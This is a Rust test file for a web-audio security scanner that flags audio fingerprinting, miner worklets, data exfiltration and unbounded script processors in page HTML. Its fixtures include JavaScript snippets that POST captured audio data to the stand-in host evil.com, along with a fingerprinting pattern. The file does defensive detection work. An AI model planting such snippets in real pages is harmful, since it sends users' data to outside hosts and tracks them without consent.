use crate::web_audio_audit::*;

#[test]
fn empty_body_returns_nothing() {
    assert!(analyze_web_audio("").is_empty());
}

#[test]
fn no_web_audio_returns_nothing() {
    assert!(analyze_web_audio("<html><body>Hello world</body></html>").is_empty());
}

#[test]
fn detects_audio_context() {
    let body = "<script>const ctx = new AudioContext();</script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::ApiDetected));
}

#[test]
fn detects_offline_audio_context() {
    let body = "<script>const ctx = new OfflineAudioContext(1, 44100, 44100);</script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::ApiDetected));
}

#[test]
fn detects_audio_worklet() {
    let body = "<script>await ctx.audioWorklet.addModule('processor.js');</script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::ApiDetected));
}

#[test]
fn detects_audio_fingerprinting() {
    let body = "<script>
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        const data = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(data);
    </script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::AudioFingerprinting));
}

#[test]
fn no_fingerprinting_without_data_extraction() {
    let body = "<script>
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        oscillator.start();
    </script>";
    let issues = analyze_web_audio(body);
    assert!(!issues.contains(&WebAudioIssue::AudioFingerprinting));
}

#[test]
fn detects_crypto_mining() {
    let body = "<script>
        await ctx.audioWorklet.addModule('miner.js');
        class MinerProcessor extends AudioWorkletProcessor {
            process() { const sab = new SharedArrayBuffer(1024); }
        }
    </script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::CryptoMining));
}

#[test]
fn no_mining_without_shared_compute() {
    let body = "<script>
        await ctx.audioWorklet.addModule('effect.js');
    </script>";
    let issues = analyze_web_audio(body);
    assert!(!issues.contains(&WebAudioIssue::CryptoMining));
}

#[test]
fn detects_data_exfiltration() {
    let body = "<script>
        const ctx = new AudioContext();
        const dest = ctx.createMediaStreamDestination();
        const recorder = new MediaRecorder(dest.stream);
        fetch('https://evil.com/upload', {method: 'POST', body: data});
    </script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::DataExfiltration));
}

#[test]
fn no_exfiltration_without_network() {
    let body = "<script>
        const ctx = new AudioContext();
        const dest = ctx.createMediaStreamDestination();
    </script>";
    let issues = analyze_web_audio(body);
    assert!(!issues.contains(&WebAudioIssue::DataExfiltration));
}

#[test]
fn detects_resource_exhaustion() {
    let body = "<script>
        const ctx = new AudioContext();
        const processor = ctx.createScriptProcessor(4096, 1, 1);
        processor.onaudioprocess = function(e) { /* process forever */ };
    </script>";
    let issues = analyze_web_audio(body);
    assert!(issues.contains(&WebAudioIssue::ResourceExhaustion));
}

#[test]
fn no_exhaustion_with_disconnect() {
    let body = "<script>
        const ctx = new AudioContext();
        const processor = ctx.createScriptProcessor(4096, 1, 1);
        processor.onaudioprocess = function(e) { /* process */ };
        processor.disconnect();
    </script>";
    let issues = analyze_web_audio(body);
    assert!(!issues.contains(&WebAudioIssue::ResourceExhaustion));
}

#[test]
fn no_exhaustion_with_close() {
    let body = "<script>
        const ctx = new AudioContext();
        const processor = ctx.createScriptProcessor(4096, 1, 1);
        ctx.close();
    </script>";
    let issues = analyze_web_audio(body);
    assert!(!issues.contains(&WebAudioIssue::ResourceExhaustion));
}

#[test]
fn all_issues_detected() {
    let body = "<script>
        const ctx = new AudioContext();
        const osc = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        analyser.getFloatFrequencyData(data);
        await ctx.audioWorklet.addModule('miner.js');
        class P extends AudioWorkletProcessor {}
        const sab = new SharedArrayBuffer(1024);
        const dest = ctx.createMediaStreamDestination();
        fetch('https://evil.com', {body: stream});
        const proc = ctx.createScriptProcessor(4096, 1, 1);
    </script>";
    let issues = analyze_web_audio(body);
    assert_eq!(issues.len(), 5);
    assert!(issues.contains(&WebAudioIssue::ApiDetected));
    assert!(issues.contains(&WebAudioIssue::AudioFingerprinting));
    assert!(issues.contains(&WebAudioIssue::CryptoMining));
    assert!(issues.contains(&WebAudioIssue::DataExfiltration));
    assert!(issues.contains(&WebAudioIssue::ResourceExhaustion));
}

#[test]
fn severity_values_correct() {
    assert_eq!(web_audio_severity(&WebAudioIssue::CryptoMining), 7.5);
    assert_eq!(web_audio_severity(&WebAudioIssue::AudioFingerprinting), 7.0);
    assert_eq!(web_audio_severity(&WebAudioIssue::DataExfiltration), 6.5);
    assert_eq!(web_audio_severity(&WebAudioIssue::ResourceExhaustion), 6.0);
    assert_eq!(web_audio_severity(&WebAudioIssue::ApiDetected), 2.0);
}

#[test]
fn display_impl_works() {
    assert_eq!(WebAudioIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(WebAudioIssue::AudioFingerprinting.to_string(), "audio_fingerprinting");
    assert_eq!(WebAudioIssue::CryptoMining.to_string(), "crypto_mining");
}

#[test]
fn operations_generated_correctly() {
    let issues = vec![WebAudioIssue::ApiDetected, WebAudioIssue::CryptoMining];
    let mut seq = 0;
    let ops = web_audio_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn operations_increment_sequence() {
    let issues = vec![WebAudioIssue::ApiDetected, WebAudioIssue::AudioFingerprinting, WebAudioIssue::ResourceExhaustion];
    let mut seq = 10;
    let ops = web_audio_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 13);
}
